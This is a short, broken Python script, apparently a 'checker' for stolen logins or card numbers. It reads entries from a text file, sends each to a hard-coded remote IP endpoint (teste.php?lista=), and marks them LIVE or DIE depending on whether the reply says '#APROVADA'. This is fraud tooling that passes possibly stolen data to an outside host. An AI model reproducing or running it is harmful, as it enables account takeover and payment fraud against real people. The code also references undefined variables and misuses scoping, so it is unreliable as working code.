#!/bin/usr/python



# -*- coding: utf-8 -*-

import requests
import json
from termcolor import colored
from time import sleep


y=0
print("Erros: "+x)
def wish():

    print("-"*40)
    print(" CHECKER WISH")
    
    print("-"*40)
    print()

    sleep(2)

    print(colored("-"*20))
    print("Erros: "+x)
    print(colored("-"*20))


    sleep(2)

    def checker(wish):

        login = wish

        re = requests.get(f"http://191.235.98.234/teste.php?lista={login}").text

        print()

        if "#APROVADA" in re:
            print(y)


            print(colored(f'LIVE 》 {wish}'))
        else:

            print(colored(f'DIE 》 {wish}'))
            y = 0
            y = x + 1
            print("Erros: "+x)

    arq = open("wish.txt","r").readlines()

    for x in arq:
        print(checker(x.replace("\n","")))

if __name__ == "__main__":
    wish()
